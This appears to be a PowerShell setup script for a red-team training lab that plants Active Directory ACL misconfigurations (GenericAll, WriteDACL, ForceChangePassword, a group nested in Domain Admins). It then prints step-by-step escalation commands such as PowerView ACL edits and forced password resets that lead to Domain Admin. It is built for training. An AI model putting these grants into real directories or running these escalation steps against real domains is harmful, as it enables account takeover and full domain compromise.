# ============================================================
# ORSUBANK AD RED TEAM LAB - EXCESSIVE PRIVILEGES (ACL ABUSE)
# ============================================================
# Script Name: Enable-ExcessivePrivileges.ps1
# Purpose: Creates ACL misconfigurations for privilege escalation
# Location: Run on DC01 (Domain Controller)
# Reboot Required: No
#
# WHAT THIS SCRIPT DOES:
# - Grants GenericAll permissions on high-value targets
# - Grants WriteDACL permissions on groups
# - Creates ForceChangePassword scenarios
# - Sets up multiple paths to Domain Admin
#
# WHY THIS IS VULNERABLE:
# Active Directory permissions are complex. Administrators often:
# - Grant excessive permissions during troubleshooting
# - Don't audit existing ACLs
# - Create "temporary" permissions that become permanent
# Attackers use BloodHound to find these hidden paths!
# ============================================================

# Verify running as Administrator on Domain Controller
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[!] ERROR: Run this script as Administrator!" -ForegroundColor Red
    exit 1
}

# Import AD module
Import-Module ActiveDirectory -ErrorAction SilentlyContinue

Write-Host @"

╔══════════════════════════════════════════════════════════════════╗
║     ORSUBANK - ENABLE EXCESSIVE PRIVILEGES (ACL ABUSE)           ║
║                                                                  ║
║  This script creates ACL misconfigurations that allow           ║
║  privilege escalation through permission abuse.                  ║
╚══════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Cyan

# ============================================================
# CREATE IT_ADMINS GROUP (Target for WriteDACL)
# ============================================================

Write-Host "[*] Creating IT_Admins group..." -ForegroundColor Yellow

$ITAdminsGroup = Get-ADGroup -Filter "Name -eq 'IT_Admins'" -ErrorAction SilentlyContinue
if (-NOT $ITAdminsGroup) {
    New-ADGroup -Name "IT_Admins" `
        -GroupScope Global `
        -GroupCategory Security `
        -Path "DC=orsubank,DC=local" `
        -Description "IT Administrators Group - High Privileges"
    
    # Add IT_Admins as member of Domain Admins (dangerous!)
    Add-ADGroupMember -Identity "Domain Admins" -Members "IT_Admins"
    Write-Host "[+] Created IT_Admins group (member of Domain Admins!)" -ForegroundColor Green
} else {
    Write-Host "[!] IT_Admins group already exists" -ForegroundColor Yellow
}

# ============================================================
# ACL ABUSE SCENARIO 1: GenericAll on User
# ============================================================
# vamsi.krishna gets GenericAll on lakshmi.devi
# lakshmi.devi is a System Administrator
# This allows password reset → impersonate admin
# ============================================================

Write-Host "`n[*] Scenario 1: Granting GenericAll on lakshmi.devi to vamsi.krishna..." -ForegroundColor Yellow

$TargetUser = Get-ADUser -Identity "lakshmi.devi"
$AttackerUser = Get-ADUser -Identity "vamsi.krishna"

# Get current ACL
$TargetDN = $TargetUser.DistinguishedName
$ACL = Get-Acl "AD:\$TargetDN"

# Create GenericAll access rule
$AttackerSID = $AttackerUser.SID
$GenericAllRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $AttackerSID,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)

# Apply the rule
$ACL.AddAccessRule($GenericAllRule)
Set-Acl "AD:\$TargetDN" $ACL

Write-Host "[+] vamsi.krishna now has GenericAll on lakshmi.devi" -ForegroundColor Green
Write-Host "    Attack: Reset lakshmi.devi's password → Impersonate System Admin" -ForegroundColor DarkGray

# ============================================================
# ACL ABUSE SCENARIO 2: WriteDACL on Group
# ============================================================
# vamsi.krishna gets WriteDACL on IT_Admins group
# IT_Admins is member of Domain Admins
# This allows: WriteDACL → Grant self GenericAll → Add self to group → DA
# ============================================================

Write-Host "`n[*] Scenario 2: Granting WriteDACL on IT_Admins to vamsi.krishna..." -ForegroundColor Yellow

$ITAdminsGroup = Get-ADGroup -Identity "IT_Admins"
$GroupDN = $ITAdminsGroup.DistinguishedName
$GroupACL = Get-Acl "AD:\$GroupDN"

# Create WriteDACL access rule
$WriteDACLRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $AttackerSID,
    [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
    [System.Security.AccessControl.AccessControlType]::Allow
)

$GroupACL.AddAccessRule($WriteDACLRule)
Set-Acl "AD:\$GroupDN" $GroupACL

Write-Host "[+] vamsi.krishna now has WriteDACL on IT_Admins group" -ForegroundColor Green
Write-Host "    Attack: Modify ACL → Grant self Write → Add self to IT_Admins → Domain Admin!" -ForegroundColor DarkGray

# ============================================================
# ACL ABUSE SCENARIO 3: ForceChangePassword on DA
# ============================================================
# divya gets ForceChangePassword on ammulu.orsu
# ammulu.orsu is Domain Admin
# This allows: Force password reset → Login as DA
# ============================================================

Write-Host "`n[*] Scenario 3: Granting ForceChangePassword on ammulu.orsu to divya..." -ForegroundColor Yellow

$TargetDA = Get-ADUser -Identity "ammulu.orsu"
$AttackerDivya = Get-ADUser -Identity "divya"

$TargetDADN = $TargetDA.DistinguishedName
$DAACL = Get-Acl "AD:\$TargetDADN"

# Create ForceChangePassword rule (Extended Right)
# GUID for "User-Force-Change-Password": 00299570-246d-11d0-a768-00aa006e0529
$ForceChangePasswordGUID = [GUID]"00299570-246d-11d0-a768-00aa006e0529"

$ForceChangeRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $AttackerDivya.SID,
    [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
    [System.Security.AccessControl.AccessControlType]::Allow,
    $ForceChangePasswordGUID
)

$DAACL.AddAccessRule($ForceChangeRule)
Set-Acl "AD:\$TargetDADN" $DAACL

Write-Host "[+] divya now has ForceChangePassword on ammulu.orsu (Domain Admin)" -ForegroundColor Green
Write-Host "    Attack: Force reset DA password → Login as Domain Admin!" -ForegroundColor DarkGray

# ============================================================
# VERIFICATION
# ============================================================

Write-Host "`n[*] Verifying ACL configurations..." -ForegroundColor Yellow

Write-Host "`n[+] Attack Paths Created:" -ForegroundColor Cyan
Write-Host @"

Path 1: vamsi.krishna → GenericAll → lakshmi.devi
        Impact: Reset password, impersonate System Admin

Path 2: vamsi.krishna → WriteDACL → IT_Admins → Domain Admins
        Impact: Add self to IT_Admins → Become Domain Admin

Path 3: divya → ForceChangePassword → ammulu.orsu (DA)
        Impact: Force password reset → Become Domain Admin

"@ -ForegroundColor White

# ============================================================
# ATTACK INSTRUCTIONS
# ============================================================

Write-Host @"

╔══════════════════════════════════════════════════════════════════╗
║                   ACL ABUSE READY!                               ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  ATTACK PATH 1: GenericAll Abuse (as vamsi.krishna)              ║
║  ──────────────────────────────────────────────────              ║
║  1. Find permission with PowerView:                              ║
║     Find-InterestingDomainAcl -ResolveGUIDs                     ║
║                                                                  ║
║  2. Reset lakshmi.devi's password:                               ║
║     net user lakshmi.devi NewPassword123! /domain               ║
║                                                                  ║
║  ATTACK PATH 2: WriteDACL Abuse (as vamsi.krishna)               ║
║  ──────────────────────────────────────────────────              ║
║  1. Grant self GenericAll on IT_Admins:                          ║
║     Add-DomainObjectAcl -TargetIdentity "IT_Admins" \            ║
║       -PrincipalIdentity "vamsi.krishna" -Rights All            ║
║                                                                  ║
║  2. Add self to IT_Admins:                                       ║
║     Add-ADGroupMember -Identity "IT_Admins" -Members vamsi.krishna ║
║                                                                  ║
║  3. Now you're Domain Admin (IT_Admins → Domain Admins)!        ║
║                                                                  ║
║  ATTACK PATH 3: ForceChangePassword (as divya)                   ║
║  ──────────────────────────────────────────────────              ║
║  1. Force password reset on DA:                                  ║
║     net user ammulu.orsu HackedPassword1! /domain               ║
║                                                                  ║
║  2. Login as ammulu.orsu → Domain Admin!                         ║
║                                                                  ║
║  DISCOVERY (BloodHound):                                         ║
║  - Mark vamsi.krishna or divya as "Owned"                        ║
║  - Run "Shortest Paths to Domain Admins"                         ║
║  - BloodHound will show these paths!                             ║
║                                                                  ║
║  Walkthrough: walkthroughs/06_acl_abuse.md                       ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Green

Write-Host "[✓] Excessive privileges (ACL abuse) configured successfully!" -ForegroundColor Green
Write-Host "`n"
